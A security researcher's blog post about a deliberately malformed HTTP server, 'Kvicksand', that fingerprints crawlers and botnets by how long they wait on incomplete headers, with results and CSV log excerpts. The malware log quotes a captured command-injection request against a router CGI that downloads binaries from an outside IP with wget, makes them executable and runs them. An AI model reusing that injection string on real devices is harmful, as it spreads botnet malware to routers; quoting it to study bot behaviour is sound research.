---
title: "Capturing Robots With Kvicksand"
date: "2021-10-18"
draft: false
---
Last year I was doing a series of[ webinars on software fuzzing](https://www.youtube.com/watch?v=_ngq3yL0dkg). Me and[ Pasi](https://www.twitter.com/pasi_s7) from F-Secure compared methods where we tried two different techniques for fuzzing HTTP clients. Fuzzing is essentially a brute-force method for finding bugs in software. You try various inputs and see what happens. My method was based on running each fuzzer engine in a Docker instance, using a local network and a shared file system for coordination between instances. I called it [the fuzzminator](https://github.com/kugg/fuzzminator). It wasn't the best method. It was too slow and only usable for small applications. It did find one application hang in the HTTP client curl that[ I reported](https://hackerone.com/reports/889160) to the maintainer[ Bagder](https://daniel.haxx.se/).

The hang
========

It's really silly. If an HTTP server responds with an incomplete header, the client will have to wait until either the server closes the connection or a client timeout is reached. Curl has a timeout option "-m, --max-time" that can be used as a hard timeout. Clearly this is not a vulnerability because that event can be handled by anyone who uses that option. Later it became apparent to me that not all HTTP clients have this option.

Here is an example of an incomplete server response:

```echo -e "HTTP/1.1 200 OK\r\nLocation:\r\nContent-Range:\r\nConnection:\r\n" | nc --listen --source-port 8080```

![](https://dim.mcusercontent.com/cs/ddd7ae486331199e51e491d97/images/4a65b922-2d5d-5037-34fc-23faa9af1b3b.jpg?w=564&dpr=2)

Introducing kvicksand
=====================

For the sake of science I decided to script a minimal malformed HTTP server designed to measure how HTTP clients handle malformed headers and timeouts. If you want to try this yourself you can find the [server here](https://github.com/kugg/kvicksand). This is how it works:

1.  The server receives a new TCP connection, logs the IP address and the time
2.  The client sends a HTTP request that the server logs
3.  The server responds with incomplete HTTP headers
4.  The server waits for the client to close the TCP connection and notes the time of closing

**Disclaimer**: *The script is written only for the purpose of collecting data to this newsletter and is not intended for production use. May it inspire you to do better!*

Results
=======

First of all, robots almost always use a consistent timeout. For instance, zgrabber always waits for 10 seconds. Twitterbot always starts with a timeout of 15 seconds when it requests the robots.txt file. This means that regardless of the User-Agent request header or source IP you can pretty much recognize an automated HTTP client on its max-timeout value.

A user who unknowingly requests Kvicksand in an `<iframe>` or an `<img>` tag rarely leaves the site after a number of whole seconds. Human visitors (almost) always leave a page (i.e. close the connection) after fractions of seconds. This means that the Kvicksand heuristics can be useful for[ determining a "CAPTCHA score"](https://antcpt.com/eng/information/demo-form/recaptcha-3-test-score.html).

Secondly, a few of the more malicious botnets around have not implemented a max-timeout at all. Forks of the Mirai botnet did not have a max-timeout so it waited and was blocked for five minutes (300 seconds was my server max-wait). I downloaded and disassembled a payload from the bot and lo and behold -- it was single-threaded and did not have a timeout, so yes you can block the bad bots!

Logs
====

Below are some log excerpts in comma-separated format (CSV):

Malware:
```
"User-agent", "timeout (seconds)", "IP address", "Request";
"KrebsOnSecurity", "0","205.185.119.4","GET /dnslookup.cgi?host_name=[www.google.com](http://www.google.com/);+cd+/tmp;rm+arm+arm7;wget+http:/\/[205.185.126.200/arm7;chmod+777+arm7;./arm7+netgear;wget+http:/\/205.185.126.200/arm;chmod+777+arm;./arm+netgear&lookup=Lookup&ess_=true](http://205.185.126.200/arm7;chmod+777+arm7;./arm7+netgear;wget+http:/%5C/205.185.126.200/arm;chmod+777+arm;./arm+netgear&lookup=Lookup&ess_=true) HTTP/1.1"
"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36", "10","180.149.125.175","GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1
"Mozila/5.0", "300","194.163.173.129","POST /HNAP1/ HTTP/1.1" <- Mirai
```
Crawlers:
```
"User-agent", "timeout (seconds)", "IP address", "Request";
"Mozilla/5.0 zgrab/0.x", "10","198.199.112.175","GET / HTTP/1.1"
"Mozilla/5.0 zgrab/0.x", "10","18.136.194.238","GET / HTTP/1.1"
"Twitterbot/1.0", "15","199.16.157.181","GET /robots.txt HTTP/1.1"
"Twitterbot/1.0", "2","199.16.157.181","GET / HTTP/1.1"
```

Still there?
============

I'm currently working with multiple clients to try to finalize my schedule. I do have time for your feedback and inquiries, so please stay in touch!

I want to send out a special thank you to [Laban Sköllermark](https://twitter.com/labanskoller) for Quality Assurance on this newsletter!
